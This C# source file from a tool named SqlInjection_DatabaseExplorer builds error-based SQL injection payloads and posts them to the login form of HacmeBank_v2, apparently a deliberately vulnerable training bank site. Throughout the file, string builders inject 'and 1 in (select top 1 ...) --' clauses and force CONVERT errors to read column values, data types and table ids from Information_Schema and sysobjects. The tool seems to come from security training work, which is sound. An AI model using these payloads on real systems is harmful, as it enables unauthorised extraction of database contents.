using System;
using System.Windows.Forms;
using System.Web;
using System.Configuration;

namespace SqlInjection_DatabaseExplorer
{
	/// <summary>
	/// Summary description for getPayload.
	/// </summary>
	public class getPayload
	{
		public static string strCustomExploitTag_before = "' and 1 in (";
		public static string strCustomExploitTag_after = ") --";

		public static string strThrowAnConvertError =  "__[ThrowAnConvertError]__";
		

        public static String getURLToPlacePayload()
        {
            return String.Format("http://{0}:{1}/HacmeBank_v2_Website/aspx/login.aspx ", ConfigurationSettings.AppSettings["IP"], ConfigurationSettings.AppSettings["Port"]);
        }

        public static String getPostDataWithPayload(String strPayload)
        {
            string strViewState = getViewStateOfLocalServer();
            if ("" == strViewState)
                MessageBox.Show(@"Error: Could not get Viewstate for this server (make sure the hacmebank website is located at http://" + ConfigurationSettings.AppSettings["IP"] + ":" + ConfigurationSettings.AppSettings["Port"] + "/HacmeBank_v2_Website/aspx/login.aspx ");
            
            return "__VIEWSTATE=" + HttpUtility.UrlEncode(strViewState) + "&txtUserName=jv" + strPayload + "&txtPassword=jv789&btnSubmit=Submit&__EVENTVALIDATION=%2FwEWBAKt9uW%2FDQKl1bKzCQK1qbSRCwLCi9reA%2F%2BgC4WsK%2BZY7DIbgqWC5CsMd6ts";
        }

        public static string getViewStateOfLocalServer()
        {

            string strRequestHttpContent = httpRequests.getWebPage(String.Format("http://" + ConfigurationSettings.AppSettings["IP"] + ":" + ConfigurationSettings.AppSettings["Port"] + "/HacmeBank_v2_Website/aspx/login.aspx"));
            string strViewState = stringFilters.extractString(strRequestHttpContent, "id=\"__VIEWSTATE\" value=\"", "\" />");
            return strViewState;
        }

		public static string varCharPayload(string strColumnName)
		{
			return " min("+ strColumnName +")";
			}

		public static string numericValuePayload(string strColumnName)
		{
			return " CONVERT(int, CONVERT(varchar, "+ strColumnName +") %2b '"+strThrowAnConvertError+"')";
		}

		public static void beforeAfterMode_Value_varChar(string strDatabaseName, string strTableName, string  strColumnName,  ref string strPayload_Before,ref string strPayload_After)
		{
			strPayload_Before = strCustomExploitTag_before + "select top 1 "+ varCharPayload(strColumnName) +" from " + strDatabaseName +".." +strTableName +" where " + strColumnName + " > '";
			strPayload_After = "' group by "+strColumnName+" order by "+strColumnName+" ASC" + strCustomExploitTag_after;
		}

		public static void beforeAfterMode_Value_numeric(string strDatabaseName, string strTableName, string  strColumnName, ref string strPayload_Before,ref string strPayload_After)
		{						
			strPayload_Before = strCustomExploitTag_before + "select top 1 "+numericValuePayload(strColumnName)+" from " + strDatabaseName +".." +strTableName +" where " + strColumnName + " > ";
			strPayload_After = " group by "+strColumnName+" order by "+strColumnName+" ASC " + strCustomExploitTag_after;			
		}

		public static string value_numeric_withCustomWhere(string strDatabaseName, string strTableName, string  strColumnName, string strCustomWhere)
		{						
			return strCustomExploitTag_before + "select top 1 "+numericValuePayload(strColumnName)+" from " + strDatabaseName +".." +strTableName +" where " + strCustomWhere + strCustomExploitTag_after;												
		}

		public static string getColumnDataType(string strDatabaseName,string strTableName, string strColumnName)
		{
			return strCustomExploitTag_before + "select top 1 min(Data_Type) from " + strDatabaseName+".Information_Schema.Columns " +
				" where ((Column_Name = '" +strColumnName + "') and (table_name='" + strTableName +"'))" + strCustomExploitTag_after;				
		}

		public static string getTableUniqueId(string strDatabaseName,string strTableName)
		{
			return strCustomExploitTag_before + "select top 1 "+numericValuePayload("id")+" from " + strDatabaseName+"..sysobjects " +
				" where ((name = '" +strTableName + "'))" + strCustomExploitTag_after;				
		}

	}

	
}
